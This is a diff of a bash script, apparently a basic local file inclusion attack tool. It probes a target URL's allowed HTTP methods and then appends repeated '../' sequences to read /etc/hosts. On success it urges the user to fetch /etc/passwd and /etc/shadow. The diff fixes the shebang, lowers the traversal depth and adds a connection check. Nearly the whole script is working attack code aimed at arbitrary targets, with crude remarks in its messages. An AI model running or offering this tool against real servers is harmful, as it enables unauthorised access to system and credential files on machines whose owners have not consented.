@@ -1,4 +1,4 @@
-!/bin/bash
+#!/bin/bash
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -8,23 +8,31 @@ CYAN='\033[0;36m'
 RESET='\033[0m'
 BOLD=' \033[1m'
 
-echo -e "${BLUE}${BOLD}T O O  B A S I C  L F I  T O O L${RESET}"
-echo "Welcome back dude, ensure to enter the target url correctly (IT MUST FINISH BY = IN ORDER TO PERFORM THE ATTACK)"
+echo -e "${BLUE}${BOLD}T O O   B A S I C   L F I   T O O L${RESET}"
+echo "Welcome back dude, ensure to enter the target url correctly (IT MUST FINISH BY = IN ORDER TO PERFORM THE ATTACK"
 
 
 url="$1"
 
 echo "Requesting the server which methods are allowed..."
 
-methods=$(curl -s -I -X OPTIONS "$url" | grep  -i  "Allow:")
-if  [ -n "$methods" ]; then 
-if  echo  "$methods" | grep -i "POST" ; then 
-echo -e "${GREEN}Request POST allowed{RESET}"
-fi
-if  echo -s "$methods" | grep -i "GET" ; then 
-echo -e "${GREEN}Request GET allowed${RESET}"
-fi
-if  echo -s "$methods" | grep -i "HEAD" ;then 
+connexion_test=$(curl -s -o /dev/null -w "%{http_code}" "$url")
+
+if [ "$connexion_test" -ge 400 ] || [ "$connexion_test" -eq 0 ]; then 
+echo -e "${RED}Maybe you should think about having an actual connexion lmao (check your fucking interfaces man)${RESET}"
+exit 1
+
+else
+
+        methods=$(curl -s -I -X OPTIONS "$url" | grep  -i  "Allow:")
+        if  [ -n "$methods" ]; then 
+                if  echo  "$methods" | grep -i "POST" ; then 
+                echo -e "${GREEN}Request POST allowed{RESET}"
+        fi
+        if  echo  "$methods" | grep -i "GET" ; then 
+                echo -e "${GREEN}Request GET allowed${RESET}"
+        fi
+if  echo "$methods" | grep -i "HEAD" ;then 
 echo -e "${GREEN}Request HEAD allowed${RESET}"
 fi
  
@@ -35,7 +43,7 @@ fi
 
 echo "how deep is your love?" 
 
-depth=10
+depth=5
 for ((i=1; i<=depth; i++)); do 
 query=$(printf '../%.0s' $(seq 1 $i))"etc/hosts" 
 url2="${url}${query}"
@@ -43,14 +51,16 @@ echo "$url"
 echo "Searching for /etc/hosts file..."
 file=$(curl -s "$url2")
 if  echo "$file" | grep -i "localhost" ; then 
+
 echo -e "${GREEN}It seems we find something interesting${RESET}"
+
 echo "Now that you know how deep is your love, you can probably fish other files such as /etc/passwd or /etc/shadow"
 echo "Have a wonderful look dude"
 exit 0
-else  
+else
 echo -e "${RED}Gotta dive deeper, my friend${RESET}"
 echo "Stade "$i" recursion"
-fi   
+fi
 done 
 echo "25% finished"
 
